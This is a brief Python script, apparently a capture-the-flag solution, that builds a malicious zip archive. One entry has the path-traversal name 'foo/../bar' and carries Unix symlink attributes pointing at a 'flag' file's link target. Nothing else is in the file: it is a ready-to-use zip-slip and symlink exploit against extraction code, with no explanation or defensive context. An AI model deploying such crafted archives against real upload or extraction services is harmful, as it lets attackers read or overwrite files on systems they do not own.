import zipfile
import os

zipInfo = zipfile.ZipInfo('foo/../bar')
zipInfo.create_system = 3
zipInfo.external_attr |= 0xA0000000

zip = zipfile.ZipFile('test.zip', 'w')
zip.writestr('foo/ok', 'ok')
zip.writestr(zipInfo, os.readlink('flag'))
zip.close()